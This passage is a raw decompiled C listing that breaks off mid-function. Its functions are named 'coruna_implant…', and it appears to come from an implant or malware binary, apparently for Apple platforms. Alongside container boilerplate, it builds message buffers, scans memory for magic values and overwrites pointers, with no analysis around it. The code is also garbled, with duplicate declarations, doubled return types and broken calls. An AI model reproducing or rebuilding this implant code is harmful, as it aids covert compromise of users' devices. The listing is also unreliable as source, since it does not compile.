  if ((unsigned long)((handle[2] - *handle >> 3) * -0x1111111111111111) < arg) {
    coruna_implant41e4_via_abort(&scratch,arg,(handle[1] - *handle >> 3) * -0x1111111111111111,handle + 2);
    scratch = (void *)*handle;
    handle = handle[1];
    ls1 = handle - (long)scratch;
    bootargs = (void *)((long)bootargs - ls1);
    if (0 < (long)ls1) {
      _memcpy(bootargs,scratch,ls1);
      scratch = (void *)*handle;
      handle = handle[1];
    }
    *handle = (long)bootargs;
    handle[1] = thread_attr;
    addr = handle[2];
    handle[2] = host_info;
    thread_attr = handle;
    if (handle - (long)scratch != 0) {
      thread_attr = handle + (((handle - (long)scratch) - 0x78U) / 0x78 ^ 0xffffffffffffffff) * 0x78;
    }
    if (scratch != (void *)0x0) {
      bootargs = scratch;
      host_info = addr;
      operator_delete(scratch);
    }
  }
  return;
}





void coruna_implant49c4_via_abort_8388(long *handle,uint64_t *val)
{
  unsigned long u;
  uint64_t *ptr;
  long handle;
  size_t ls4;
  long addr;
  unsigned long size;
  uint64_t version;
  uint64_t port;
  uint64_t tag;
  uint64_t kind;
  uint64_t type_id;
  uint64_t type_id_8;
  uint64_t type_id_9;
  void *scratch;
  void *bootargs;
  uint64_t *thread_attr;
  long host_info;
  
  ptr = (uint64_t *)handle[1];
  if (ptr < (uint64_t *)handle[2]) {
    port = val[1];
    version = *val;
    kind = val[3];
    tag = val[2];
    type_id = val[4];
    type_id_9 = val[7];
    type_id_8 = val[6];
    ptr[5] = val[5];
    ptr[4] = type_id;
    ptr[7] = type_id_9;
    ptr[6] = type_id_8;
    ptr[1] = port;
    *ptr = version;
    ptr[3] = kind;
    ptr[2] = tag;
    port = val[9];
    version = val[8];
    kind = val[0xb];
    tag = val[10];
    type_id_8 = val[0xd];
    type_id = val[0xc];
    ptr[0xe] = val[0xe];
    ptr[0xb] = kind;
    ptr[10] = tag;
    ptr[0xd] = type_id_8;
    ptr[0xc] = type_id;
    ptr[9] = port;
    ptr[8] = version;
    handle[1] = (long)(ptr + 0xf);
  }
  else {
    handle = ((long)ptr - *handle >> 3) * -0x1111111111111111;
    u = handle + 1;
    if (0x222222222222222 < u) {
      coruna_abort_8388();
    }
    addr = handle[2] - *handle >> 3;
    size = addr * -0x2222222222222222;
    if (u <= size) {
      u = size;
    }
    if (0x111111111111110 < (unsigned long)(addr * -0x1111111111111111)) {
      u = 0x222222222222222;
    }
    coruna_implant41e4_via_abort(&scratch,u,handle,handle + 2);
    port = val[5];
    version = val[4];
    kind = val[7];
    tag = val[6];
    type_id = *val;
    type_id_9 = val[3];
    type_id_8 = val[2];
    thread_attr[1] = val[1];
    *thread_attr = type_id;
    thread_attr[3] = type_id_9;
    thread_attr[2] = type_id_8;
    thread_attr[5] = port;
    thread_attr[4] = version;
    thread_attr[7] = kind;
    thread_attr[6] = tag;
    kind = val[0xb];
    tag = val[10];
    port = val[0xd];
    version = val[0xc];
    type_id_8 = val[9];
    type_id = val[8];
    thread_attr[0xe] = val[0xe];
    thread_attr[0xb] = kind;
    thread_attr[10] = tag;
    thread_attr[0xd] = port;
    thread_attr[0xc] = version;
    thread_attr[9] = type_id_8;
    thread_attr[8] = type_id;
    thread_attr = thread_attr + 0xf;
    scratch = (void *)*handle;
    handle = handle[1];
    ls4 = handle - (long)scratch;
    bootargs = (void *)((long)bootargs - ls4);
    if (0 < (long)ls4) {
      _memcpy(bootargs,scratch,ls4);
      scratch = (void *)*handle;
      handle = handle[1];
    }
    *handle = (long)bootargs;
    handle[1] = (long)thread_attr;
    addr = handle[2];
    handle[2] = host_info;
    thread_attr = (uint64_t *)handle;
    if (handle - (long)scratch != 0) {
      thread_attr = (uint64_t *)
                 (handle + (((handle - (long)scratch) - 0x78U) / 0x78 ^ 0xffffffffffffffff) * 0x78);
    }
    if (scratch != (void *)0x0) {
      bootargs = scratch;
      host_info = addr;
      operator_delete(scratch);
    }
  }
  return;
}





long coruna_sleep(long handle,long addr_2)
{
  long *ptr;
  long handle;
  long addr;
  long off;
  long base;
  long ctx_val;
  long serial;
  
  ctx_val = *(long *)(handle + 0x2f0);
  handle = *(long *)(handle + 0x2f8);
  serial = *(long *)(handle + 0x2c0);
  addr = *(long *)(handle + 0x2c8);
  ptr = operator_new(0x30);
  base = 0;
  off = 0;
  *ptr = handle + 0x40;
  ptr[1] = 0x280;
  ptr[2] = ctx_val;
  ptr[3] = handle - ctx_val;
  ptr[4] = serial;
  ptr[5] = addr - serial;
  do {
    addr = *(long *)((long)ptr + base);
    ctx_val = ((long *)((long)ptr + base))[1];
    handle = ctx_val + addr;
    if ((addr <= addr_2 && handle != addr_2) && (addr_2 < addr || addr_2 <= handle)) {
      base = ((off + addr_2) - addr) + *(long *)(handle + 0x310);
      if (base != 0) {
        operator_delete(ptr);
        return base;
      }
      break;
    }
    off = ctx_val + off;
    base = base + 0x10;
  } while (base != 0x30);
  do {
    _sleep(1);
  } while( true );
}





void coruna_abort_80e4(void)
{
  _abort();
}





void coruna_call_abort_80e4(uint64_t *val,unsigned long arg)
{
  void *ptr;
  
  if (-1 < (long)arg) {
    ptr = operator_new(arg);
    *val = ptr;
    val[1] = ptr;
    val[2] = (long)ptr + arg;
    return;
  }
  coruna_abort_80e4();
}





uint64_t * coruna_memcpy_812c(uint64_t *val,long *handle)
{
  void *ptr;
  size_t ls2;
  
  *val = 0;
  val[1] = 0;
  val[2] = 0;
  if (handle[1] - *handle != 0) {
    coruna_call_abort_80e4(val,handle[1] - *handle);
    ptr = (void *)val[1];
    ls2 = handle[1] - *handle;
    if (0 < (long)ls2) {
      _memcpy(ptr,(void *)*handle,ls2);
      ptr = (void *)((long)ptr + ls2);
    }
    val[1] = ptr;
  }
  return val;
}





void coruna_abort_819c(void)
{
  _abort();
}





long * coruna_implant41e4_via_cat_5(long *handle,uint *size)
{
  uint u;
  unsigned long size;
  unsigned long version;
  unsigned long port;
  unsigned long tag;
  long *ptr;
  unsigned long kind;
  uint16_t type_id;
  uint64_t type_id_8;
  unsigned long type_id_9;
  
  version = handle[1];
  if (version != 0) {
    u = *size;
    port = (unsigned long)u;
    type_id_8 = coruna_cat(POPCOUNT((char)(version >> 0x38)),
                     coruna_cat(POPCOUNT((char)(version >> 0x30)),
                              coruna_cat(POPCOUNT((char)(version >> 0x28)),
                                       coruna_u64_pack14((POPCOUNT((char)(version >> 0x20))), (coruna_cat(POPCOUNT((char))(version >> 0x18)),
                                                         coruna_cat(POPCOUNT((char)(version >> 0x10)),
                                                                  coruna_cat(POPCOUNT((char)(version >> 
                                                  8)),POPCOUNT((char)version))))))));
    type_id = NEON_uaddlv(type_id_8,1);
    type_id_9 = coruna_cat((int6)((unsigned long)type_id_8 >> 0x10),type_id);
    if ((type_id_9 & 0xffffffff) < 2) {
      tag = (unsigned long)((int)version - 1U & u);
    }
    else {
      tag = port;
      if (version <= port) {
        tag = 0;
        if (version != 0) {
          tag = port / version;
        }
        tag = port - tag * version;
      }
    }
    ptr = *(long **)(*handle + tag * 8);
    if (ptr != (long *)0x0) {
      ptr = (long *)*ptr;
      if (ptr != (long *)0x0) {
        do {
          kind = ptr[1];
          if (kind == port) {
            if (*(uint *)(ptr + 2) == u) {
              return ptr;
            }
          }
          else {
            if ((type_id_9 & 0xffffffff) < 2) {
              kind = kind & version - 1;
            }
            else if (version <= kind) {
              size = 0;
              if (version != 0) {
                size = kind / version;
              }
              kind = kind - size * version;
            }
            if (kind != tag) {
              return (long *)0x0;
            }
          }
          ptr = (long *)*ptr;
        } while (ptr != (long *)0x0);
      }
      return (long *)0x0;
    }
  }
  return (long *)0x0;
}





long coruna_implant41e4_residual_54(uint64_t *val,uint64_t *id_2,uint8_t *buf)
{
  void *ptr;
  void *buf;
  size_t ls3;
  uint8_t *ptr;
  uint64_t u;
  uint8_t *buf;
  long handle;
  uint8_t *str;
  
  handle = id_2[1];
  buf = (void *)*val;
  ls3 = (long)buf - (long)buf;
  ptr = (void *)(handle - ls3);
  id_2[1] = ptr;
  if (0 < (long)ls3) {
    _memcpy(ptr,buf,ls3);
  }
  ptr = (uint8_t *)val[1];
  if (ptr != buf) {
    buf = (uint8_t *)id_2[2];
    do {
      str = buf + 1;
      *buf = *buf;
      buf = (uint8_t *)(id_2[2] + 1);
      id_2[2] = buf;
      buf = str;
    } while (str != ptr);
  }
  u = *val;
  *val = id_2[1];
  id_2[1] = u;
  u = val[1];
  val[1] = id_2[2];
  id_2[2] = u;
  u = val[2];
  val[2] = id_2[3];
  id_2[3] = u;
  *id_2 = id_2[1];
  return handle;
}





uint64_t * coruna_implant41e4_via_abort(uint64_t *val,unsigned long arg,long handle,uint64_t id_2)
{
  void *ptr;
  void *buf;
  
  val[3] = 0;
  val[4] = id_2;
  if (arg == 0) {
    ptr = (void *)0x0;
  }
  else {
    if (0x222222222222222 < arg) {
      coruna_abort();
    }
    ptr = operator_new(arg * 0x78);
  }
  buf = (void *)((long)ptr + handle * 0x78);
  *val = ptr;
  val[1] = buf;
  val[2] = buf;
  val[3] = (void *)((long)ptr + arg * 0x78);
  return val;
}





void coruna_abort_8388(void)
{
  _abort();
}





void coruna_implant49c4_via_sleep(long *handle,long *addr_2,int flags)
{
  uint64_t *ptr;
  uint64_t *buf;
  long handle;
  long addr;
  uint64_t u;
  uint64_t size;
  uint32_t scratch;
  uint32_t bootargs;
  uint32_t thread_attr;
  
  if (flags != 0) {
    bootargs = 4;
    handle = coruna_implant41e4_via_cat_4(*handle + 0x28,&bootargs);
    u = *(uint64_t *)(handle + 0x18);
    scratch = 0x13;
    handle = coruna_implant41e4_via_cat_4(*handle + 0x28,&scratch);
    size = *(uint64_t *)(handle + 0x18);
    thread_attr = 0x12;
    handle = coruna_implant41e4_via_cat_4(*handle + 0x28,&thread_attr);
    coruna_implant49c4_residual_55(handle,*(uint64_t *)(handle + 0x18),size,u);
  }
  buf = (uint64_t *)addr_2[1];
  for (ptr = (uint64_t *)*addr_2; ptr != buf; ptr = ptr + 2) {
    u = coruna_sleep(handle,*ptr);
    handle = coruna_sleep(handle,ptr[1]);
    thread_attr = 0x1f;
    addr = coruna_implant41e4_via_cat_4(*handle + 0x28,&thread_attr);
    coruna_implant49c4_residual_55(handle,*(uint64_t *)(addr + 0x18),handle + -0x10,u);
  }
  return;
}





uint64_t coruna_implant49c4_residual_55(long *handle,uint64_t val,uint64_t id_2,uint64_t size_3)
{
  long handle;
  uint32_t scratch;
  
  scratch = 0x1e;
  handle = coruna_implant41e4_via_cat_4(*handle + 0x28,&scratch);
  coruna_implant49c4_via_sleep_2(handle,*(uint64_t *)(handle + 0x18),size_3);
  coruna_implant49c4_via_sleep_2(handle,val,id_2);
  return 0;
}





uint64_t
void coruna_implant49c4_residual_56(long *handle,uint64_t val,uint64_t id_2,uint64_t size_3,
            uint64_t off_4)
{
  long handle;
  uint32_t scratch;
  
  scratch = 0x1e;
  handle = coruna_implant41e4_via_cat_4(*handle + 0x28,&scratch);
  coruna_implant49c4_via_sleep_2(handle,*(uint64_t *)(handle + 0x18),off_4);
  coruna_implant49c4_residual_55(handle,val,id_2,size_3);
  return 0;
}





uint64_t
void coruna_implant49c4_residual_57(long *handle,uint64_t val,uint64_t id_2,uint64_t size_3,
            uint64_t off_4,uint64_t off_5)
{
  long handle;
  uint64_t *ptr;
  uint32_t scratch;
  
  scratch = 0x22;
  handle = coruna_implant41e4_via_cat_4(*handle + 0x28,&scratch);
  handle = *(long *)(handle + 0x18);
  ptr = (uint64_t *)coruna_implant49c4_residual_60(handle);
  if (ptr != (uint64_t *)0x0) {
    *ptr = 0;
    ptr[1] = handle + -0x50;
  }
  coruna_implant49c4_residual_59(handle,val,id_2,size_3,off_4,off_5);
  return 0;
}





void coruna_implant49c4_residual_58(long *handle,long addr_2)
{
  long handle;
  uint32_t scratch;
  
  scratch = 0x1d;
  handle = coruna_implant41e4_via_cat_4(*handle + 0x28,&scratch);
  coruna_implant49c4_residual_55(handle,*(uint64_t *)(handle + 0x18),0,addr_2 + -0x1d);
  return;
}





uint64_t
void coruna_implant49c4_residual_59(long *handle,uint64_t val,uint64_t id_2,uint64_t size_3,
            uint64_t off_4,uint64_t off_5)
{
  long handle;
  uint32_t scratch;
  
  scratch = 0x1e;
  handle = coruna_implant41e4_via_cat_4(*handle + 0x28,&scratch);
  coruna_implant49c4_via_sleep_2(handle,*(uint64_t *)(handle + 0x18),off_5);
  coruna_implant49c4_residual_56(handle,val,id_2,size_3,off_4);
  return 0;
}





void coruna_call_abort_8750(uint64_t *val,unsigned long arg)
{
  void *ptr;
  
  if (arg >> 0x3c == 0) {
    ptr = operator_new(arg << 4);
    *val = ptr;
    val[1] = ptr;
    val[2] = (void *)((long)ptr + arg * 0x10);
    return;
  }
  coruna_abort_8750();
}





void coruna_abort_8750(void)
{
  _abort();
}





uint64_t * coruna_memcpy_7be8(uint64_t *val,long *handle)
{
  void *ptr;
  size_t ls2;
  
  *val = 0;
  val[1] = 0;
  val[2] = 0;
  if (handle[1] - *handle != 0) {
    coruna_call_abort_8750(val,handle[1] - *handle >> 4);
    ptr = (void *)val[1];
    ls2 = handle[1] - *handle;
    if (0 < (long)ls2) {
      _memcpy(ptr,(void *)*handle,ls2);
      ptr = (void *)((long)ptr + ls2);
    }
    val[1] = ptr;
  }
  return val;
}





uint64_t coruna_implant49c4_via_sleep_2(long handle,long addr_2,long off_3)
{
  long *ptr;
  uint64_t u;
  long handle;
  long addr;
  uint64_t *ptr;
  
  ptr = (long *)coruna_implant49c4_residual_60();
  if (ptr != (long *)0x0) {
    ptr[1] = addr_2 + -0x50;
    if (off_3 == 0xfffffda063101) {
      for (handle = *(long *)(handle + 0x2c0); handle != *(long *)(handle + 0x2c8);
          handle = handle + 0x78) {
        addr = 0x10;
        do {
          if (*(long *)(handle + addr) == 0xffff101360adf) {
            ptr = (uint64_t *)(handle + addr);
            goto fail;
          }
          addr = addr + 0x10;
        } while (addr != 0x60);
      }
      ptr = (uint64_t *)0x0;
fail:
      u = coruna_sleep(handle,ptr);
      *ptr = u;
      *ptr = 0;
    }
    else {
      *ptr = off_3;
    }
  }
  return 0;
}





long coruna_implant49c4_residual_60(long handle)
{
  long handle;
  long addr;
  
  handle = 0;
  addr = *(long *)(handle + 0x308);
  do {
    if (*(long *)(addr + 0x18) == 0) {
      if ((uint)-(int)handle < 5) {
        return addr + 0x10;
      }
      break;
    }
    handle = handle + -1;
    addr = addr + 0x10;
  } while (handle != -5);
  coruna_implant49c4_via_sleep_3(handle,1);
  handle = 0;
  addr = *(long *)(handle + 0x308);
  do {
    if (*(long *)(addr + 0x18) == 0) {
      if ((uint)-(int)handle < 5) {
        return addr + 0x10;
      }
      return 0;
    }
    handle = handle + -1;
    addr = addr + 0x10;
  } while (handle != -5);
  return 0;
}





long coruna_implant49c4_via_sleep_3(long *handle,int flags)
{
  long handle;
  uint64_t u;
  long addr;
  uint64_t scratch;
  uint64_t scratch;
  uint64_t bootargs;
  uint64_t bootargs;
  uint64_t thread_attr;
  uint64_t host_info;
  uint64_t thread_attr;
  uint64_t serial_buf;
  uint64_t action;
  uint64_t block_ctx;
  uint64_t host_info;
  uint64_t stack_guard;
  uint64_t serial_buf;
  uint64_t action;
  uint64_t sa_saved;
  long block_ctx;
  
  block_ctx = *(long *)k_implant_stack_chk_guard_slot;
  scratch = 0xffffffffffffffff;
  scratch = 0xffffffffffffffff;
  bootargs = 0;
  bootargs = 0;
  host_info = 0;
  thread_attr = 0;
  serial_buf = 0;
  thread_attr = 0;
  block_ctx = 0;
  action = 0;
  stack_guard = 0;
  host_info = 0;
  action = 0;
  sa_saved = 0;
  serial_buf = 0xffffffffffffffff;
  coruna_implant49c4_via_abort_8388(handle + 0x58,&scratch);
  addr = handle[0x61];
  handle[0x61] = handle[0x59] + -0x78;
  if (flags != 0) {
    scratch = coruna_u64_pack((scratch), (0x17));
    handle = coruna_implant41e4_via_cat_4(*handle + 0x28,&scratch);
    *(long *)(addr + 0x70) = *(long *)(handle + 0x18) + -0x50;
    u = coruna_sleep(handle,handle[0x61]);
    *(uint64_t *)(addr + 0x68) = u;
  }
  if (*(long *)k_implant_stack_chk_guard_slot == block_ctx) {
    return addr;
  }
  ___stack_chk_fail();
}





void coruna_return_zero_16450(uint64_t *val,uint64_t *id_2,uint64_t *size_3)
{
  uint64_t *ptr;
  uint64_t u;
  uint64_t *buf;
  long handle;
  unsigned long size;
  size_t ls6;
  unsigned long version;
  void *ptr;
  
  ls6 = (long)size_3 - (long)id_2;
  version = (long)ls6 >> 4;
  handle = val[2];
  buf = (uint64_t *)*val;
  if ((unsigned long)(handle - (long)buf >> 4) < version) {
    if (buf != (uint64_t *)0x0) {
      val[1] = buf;
      operator_delete(buf);
      handle = 0;
      *val = 0;
      val[1] = 0;
      val[2] = 0;
    }
    if ((long)ls6 < 0) {
      coruna_abort_8750();
    }
    if (version <= (unsigned long)(handle >> 3)) {
      version = handle >> 3;
    }
    if (0x7fffffffffffffe < (unsigned long)(handle >> 4)) {
      version = 0xfffffffffffffff;
    }
    coruna_call_abort_8750(val,version);
    ptr = (void *)val[1];
    if (ls6 != 0) {
      _memcpy(ptr,id_2,ls6);
      ptr = (void *)((long)ptr + ls6);
    }
    val[1] = ptr;
  }
  else {
    ptr = (void *)val[1];
    size = (long)ptr - (long)buf >> 4;
    ptr = (uint64_t *)((long)id_2 + ((long)ptr - (long)buf));
    if (version <= size) {
      ptr = size_3;
    }
    for (; ptr != id_2; id_2 = id_2 + 2) {
      u = id_2[1];
      *buf = *id_2;
      buf[1] = u;
      buf = buf + 2;
    }
    if (size < version) {
      ls6 = (long)size_3 - (long)ptr;
      if (0 < (long)ls6) {
        _memcpy(ptr,ptr,ls6);
        ptr = (void *)((long)ptr + ls6);
      }
      val[1] = ptr;
    }
    else {
      val[1] = buf;
    }
  }
  return;
}





void coruna_implant49c4_via_abort_80e4(long handle,long *addr_2)
{
  unsigned long u;
  uint8_t *ptr;
  long *ptr;
  void *buf;
  long handle;
  long addr;
  unsigned long size;
  unsigned long version;
  long off;
  void *str;
  unsigned long port;
  long base;
  long ctx_val;
  uint8_t *buf;
  
  base = *(long *)(handle + 0x2f0);
  handle = *(long *)(handle + 0x2f8);
  ctx_val = *(long *)(handle + 0x2c0);
  addr = *(long *)(handle + 0x2c8);
  ptr = operator_new(0x30);
  off = 0;
  *ptr = handle + 0x40;
  ptr[1] = 0x280;
  ptr[2] = base;
  ptr[3] = handle - base;
  ptr[4] = ctx_val;
  ptr[5] = addr - ctx_val;
  do {
    handle = *(long *)((long)ptr + off);
    coruna_implant49c4_via_implant41e4_residual_54(addr_2,addr_2[1],handle,handle + ((long *)((long)ptr + off))[1]);
    off = off + 0x10;
  } while (off != 0x30);
  str = (void *)*addr_2;
  port = addr_2[1] - (long)str;
  ptr = (uint8_t *)addr_2[1];
  do {
    if ((port & 7) == 0) {
      operator_delete(ptr);
      return;
    }
    if (ptr < (uint8_t *)addr_2[2]) {
      buf = ptr + 1;
      *ptr = 0;
      addr_2[1] = (long)buf;
    }
    else {
      u = port + 1;
      if ((long)u < 0) {
        coruna_abort_80e4();
      }
      size = addr_2[2] - (long)str;
      version = size * 2;
      if (u <= version) {
        u = version;
      }
      if (0x3ffffffffffffffe < size) {
        u = 0x7fffffffffffffff;
      }
      if (u == 0) {
        buf = (void *)0x0;
      }
      else {
        buf = operator_new(u);
      }
      buf = (uint8_t *)((long)buf + port) + 1;
      *(uint8_t *)((long)buf + port) = 0;
      if (0 < (long)port) {
        _memcpy(buf,str,port);
      }
      *addr_2 = (long)buf;
      addr_2[1] = (long)buf;
      addr_2[2] = (long)buf + u;
      if (str != (void *)0x0) {
        operator_delete(str);
        buf = (uint8_t *)addr_2[1];
      }
    }
    str = (void *)*addr_2;
    port = (long)buf - (long)str;
    ptr = buf;
  } while( true );
}





long coruna_implant41e4_via_dlclose(long handle)
{
  void *ptr;
  
  coruna_dlclose(handle + 800);
  ptr = *(void **)(handle + 0x2f0);
  if (ptr != (void *)0x0) {
    *(void **)(handle + 0x2f8) = ptr;
    operator_delete(ptr);
  }
  if (*(char *)(handle + 0x2ef) < '\0') {
    operator_delete(*(void **)(handle + 0x2d8));
  }
  ptr = *(void **)(handle + 0x2c0);
  if (ptr != (void *)0x0) {
    *(void **)(handle + 0x2c8) = ptr;
    operator_delete(ptr);
  }
  return handle;
}





uint64_t * coruna_dlclose(uint64_t *val)
{
  void *ptr;
  void *buf;
  void *str;
  
  ptr = (void *)*val;
  if (ptr != (void *)0x0) {
    str = ptr;
    buf = (void *)val[1];
    if ((void *)val[1] != ptr) {
      do {
        str = (void *)((long)buf + -0x10);
        if (*(long *)((long)buf + -8) != 0) {
          _dlclose();
          *(uint64_t *)((long)buf + -8) = 0;
        }
        buf = str;
      } while (str != ptr);
      str = (void *)*val;
    }
    val[1] = ptr;
    operator_delete(str);
  }
  return val;
}





uint64_t * coruna_implant41e4_via_implant6dec_residual_87(uint64_t *val)
{
  void *ptr;
  
  coruna_implant6dec_residual_87(val,val[2]);
  ptr = (void *)*val;
  *val = 0;
  if (ptr != (void *)0x0) {
    operator_delete(ptr);
  }
  return val;
}





void coruna_implant6dec_residual_87(uint64_t val,uint64_t *id_2)
{
  void *ptr;
  void *buf;
  
  while (id_2 != (void *)0x0) {
    buf = (void *)*id_2;
    ptr = (void *)id_2[3];
    if (ptr != (void *)0x0) {
      id_2[4] = ptr;
      operator_delete(ptr);
    }
    operator_delete(id_2);
    id_2 = buf;
  }
  return;
}





uint64_t * coruna_implant41e4_residual_6(uint64_t *val)
{
  uint64_t *ptr;
  void *ptr;
  
  ptr = (void *)val[2];
  while (ptr != (void *)0x0) {
    ptr = (void *)*ptr;
    operator_delete(ptr);
    ptr = ptr;
  }
  ptr = (void *)*val;
  *val = 0;
  if (ptr != (void *)0x0) {
    operator_delete(ptr);
  }
  return val;
}





uint64_t * coruna_memcpy_7be8_8df0(uint64_t *val,long *handle)
{
  void *ptr;
  size_t ls2;
  
  *val = 0;
  val[1] = 0;
  val[2] = 0;
  if (handle[1] - *handle != 0) {
    coruna_call_abort_8ea4(val,handle[1] - *handle >> 5);
    ptr = (void *)val[1];
    ls2 = handle[1] - *handle;
    if (0 < (long)ls2) {
      _memcpy(ptr,(void *)*handle,ls2);
      ptr = (void *)((long)ptr + ls2);
    }
    val[1] = ptr;
  }
  return val;
}





void coruna_call_abort_8ea4(uint64_t *val,unsigned long arg)
{
  void *ptr;
  
  if (arg >> 0x3b == 0) {
    ptr = operator_new(arg << 5);
    *val = ptr;
    val[1] = ptr;
    val[2] = (void *)((long)ptr + arg * 0x20);
    return;
  }
  coruna_abort_8ea4();
}





void coruna_abort_8ea4(void)
{
  _abort();
}





long coruna_implant41e4_residual_61(uint64_t *val,uint64_t *id_2,uint32_t *size)
{
  void *ptr;
  void *buf;
  size_t ls3;
  uint32_t *ptr;
  uint64_t u;
  uint32_t *buf;
  uint32_t *str;
  long handle;
  uint32_t *copy;
  
  handle = id_2[1];
  buf = (void *)*val;
  ls3 = (long)size - (long)buf;
  ptr = (void *)(handle - ls3);
  id_2[1] = ptr;
  if (0 < (long)ls3) {
    _memcpy(ptr,buf,ls3);
  }
  ptr = (uint32_t *)val[1];
  if (ptr != size) {
    buf = (uint32_t *)id_2[2];
    do {
      copy = size + 1;
      str = buf + 1;
      *buf = *size;
      buf = str;
      size = copy;
    } while (copy != ptr);
    id_2[2] = str;
  }
  u = *val;
  *val = id_2[1];
  id_2[1] = u;
  u = val[1];
  val[1] = id_2[2];
  id_2[2] = u;
  u = val[2];
  val[2] = id_2[3];
  id_2[3] = u;
  *id_2 = id_2[1];
  return handle;
}





uint64_t coruna_implant41e4_via_u64_pack_2(uint32_t *size)
{
  uint16_t *ptr;
  uint64_t u;
  uint32_t scratch[2];
  uint32_t bootargs;
  uint64_t thread_attr;
  uint64_t host_info;
  uint32_t serial_buf;
  long action;
  
  action = *(long *)k_implant_stack_chk_guard_slot;
  host_info = 0;
  thread_attr = 0;
  ptr = _malloc(0x1000);
  *ptr = 1;
  ptr[1] = *(uint16_t *)((long)size + 0x126);
  *(uint32_t *)(ptr + 2) = 0;
  u = *(uint64_t *)(size + 0x12);
  *(uint64_t *)(ptr + 4) = 0;
  *(uint64_t *)(ptr + 8) = u;
  u = *(uint64_t *)(size + 0x30);
  *(uint64_t *)(ptr + 0xc) = *(uint64_t *)(size + 0xc);
  *(uint64_t *)(ptr + 0x10) = u;
  *(uint64_t *)(ptr + 0x14) = u;
  scratch[0] = 2;
  bootargs = *size;
  thread_attr = coruna_u64_pack((0x130000), ((uint32_t))thread_attr);
  host_info = coruna_u64_pack((host_info), (size[0x34]));
  serial_buf = 0x110000;
  u = coruna_vm_deallocate(ptr,ptr,0x30,scratch,&bootargs,size[1]);
  _free(ptr);
  if (*(long *)k_implant_stack_chk_guard_slot == action) {
    return u;
  }
  ___stack_chk_fail();
}





uint64_t
void coruna_semaphore_timedwait(long handle,unsigned long arg,unsigned long arg,unsigned long val,uint32_t size,
            uint8_t buf,uint32_t flags_2,uint32_t version_3,uint64_t val)
{
  unsigned long u;
  kern_return_t lk2;
  unsigned long *ptr;
  uint64_t size;
  uint32_t scratch[2];
  uint32_t bootargs[2];
  uint32_t thread_attr;
  long host_info;
  
  host_info = *(long *)k_implant_stack_chk_guard_slot;
  ptr = _malloc(0x1000);
  *(uint16_t *)ptr = 0;
  *(uint16_t *)((long)ptr + 2) = *(uint16_t *)(handle + 0x136);
  *(uint32_t *)((long)ptr + 4) = 0;
  u = *(long *)(handle + 0x70) + 1;
  *(unsigned long *)(handle + 0x70) = u;
  ptr[1] = arg;
  ptr[2] = u;
  ptr[3] = arg;
  ptr[4] = val;
  *(uint8_t *)(ptr + 5) = 0;
  *(uint8_t *)((long)ptr + 0x29) = buf;
  *(uint8_t *)((long)ptr + 0x2a) = 0;
  *(uint32_t *)((long)ptr + 0x2c) = 0;
  ptr[6] = 0x11;
  *(uint8_t *)(ptr + 9) = 0x42;
  size = s_kCGColorSpaceSRGB_0000feaa._0_8_;
  ptr[8] = s_kCGColorSpaceSRGB_0000feaa._8_8_;
  ptr[7] = size;
  *(uint32_t *)((long)ptr + 0x49) = flags_2;
  *(uint32_t *)((long)ptr + 0x4d) = version_3;
  *(uint8_t *)((long)ptr + 0x51) = (uint8_t)val;
  *(long *)((long)ptr + 0x55) = (long)val._4_4_;
  scratch[0] = 1;
  thread_attr = 0x130000;
  bootargs[0] = size;
  coruna_vm_deallocate(ptr,ptr,0x59,scratch,bootargs,*(uint32_t *)(handle + 0x108));
  ptr[3] = 0;
  ptr[2] = 0;
  ptr[5] = 0;
  ptr[4] = 0;
  ptr[7] = 0;
  ptr[6] = 0;
  ptr[9] = 0;
  ptr[8] = 0;
  *(uint64_t *)((long)ptr + 0x51) = 0;
  *(uint64_t *)((long)ptr + 0x49) = 0;
  *ptr = (unsigned long)*(ushort *)(handle + 0x122);
  ptr[1] = 0;
  size = coruna_semaphore_signal(0x80000000,*(long *)(handle + 0x20) + 0x10,ptr,0x10,1,handle,
                       *(uint64_t *)(handle + 0xf8));
  lk2 = _semaphore_timedwait(*(semaphore_t *)(handle + 0x14),(mach_timespec_t)0x2);
  if (lk2 == 0x31) {
    size = 0x31;
  }
  else {
    *(long *)(handle + 0x20) = *(long *)(handle + 0x20) + 0x10;
    _free(ptr);
  }
  if (*(long *)k_implant_stack_chk_guard_slot == host_info) {
    return size;
  }
  ___stack_chk_fail();
}





uint8_t
void coruna_semaphore_timedwait_91dc(long handle,unsigned long arg,unsigned long arg,uint8_t buf,uint32_t size,
            uint32_t flags_2,void *ctx,size_t len,uint64_t val,uint64_t id_2,
            uint64_t size_3,byte arg_x)
{
  uint32_t *ptr;
  semaphore_t semaphore;
  uint64_t u;
  kern_return_t lk3;
  unsigned long *buf;
  unsigned long *str;
  long handle;
  long addr;
  uint64_t *copy;
  uint8_t size;
  unsigned long version;
  uint32_t scratch[2];
  uint8_t bootargs[8];
  
  buf = _malloc(len + 0x1000);
  *(uint16_t *)buf = 0;
  *(uint16_t *)((long)buf + 2) = *(uint16_t *)(handle + 0x138);
  *(uint32_t *)((long)buf + 4) = 0;
  buf[1] = arg;
  buf[2] = arg;
  *(uint8_t *)(buf + 3) = 0;
  *(uint8_t *)((long)buf + 0x19) = buf;
  *(uint8_t *)((long)buf + 0x1a) = 0;
  *(uint32_t *)((long)buf + 0x1c) = 0;
  buf[4] = 0x11;
  *(uint8_t *)(buf + 7) = 0x42;
  u = s_kCGColorSpaceSRGB_0000feaa._0_8_;
  buf[6] = s_kCGColorSpaceSRGB_0000feaa._8_8_;
  buf[5] = u;
  *(uint32_t *)((long)buf + 0x3c) = size;
  *(uint32_t *)(buf + 8) = flags_2;
  buf[9] = len;
  if (len == 0) {
    handle = 0x50;
    str = buf;
  }
  else {
    str = _memcpy(buf + 10,ctx,len);
    handle = len + 0x50;
  }
  ptr = (uint32_t *)((long)buf + handle);
  *ptr = (uint32_t)val;
  ptr[1] = val._4_4_;
  ptr[2] = (uint32_t)id_2;
  ptr[3] = id_2._4_4_;
  ptr[4] = (uint32_t)size_3;
  ptr[5] = size_3._4_4_;
  *(ushort *)(ptr + 6) = (ushort)arg_x;
  scratch[0] = 0;
  coruna_vm_deallocate(str,buf,handle + 0x1aU,scratch,bootargs,*(uint32_t *)(handle + 0x108));
  _bzero(buf,handle + 0x1aU);
  *buf = (unsigned long)*(ushort *)(handle + 0x122);
  buf[1] = 0;
  addr = *(long *)(handle + 0x20);
  copy = *(uint64_t **)(handle + 0xf8);
  handle = 0x18;
  if (*(uint64_t **)(handle + 200) != copy) {
    handle = 0x10;
  }
  semaphore = *(semaphore_t *)(handle + handle);
  *copy = 0x80000000;
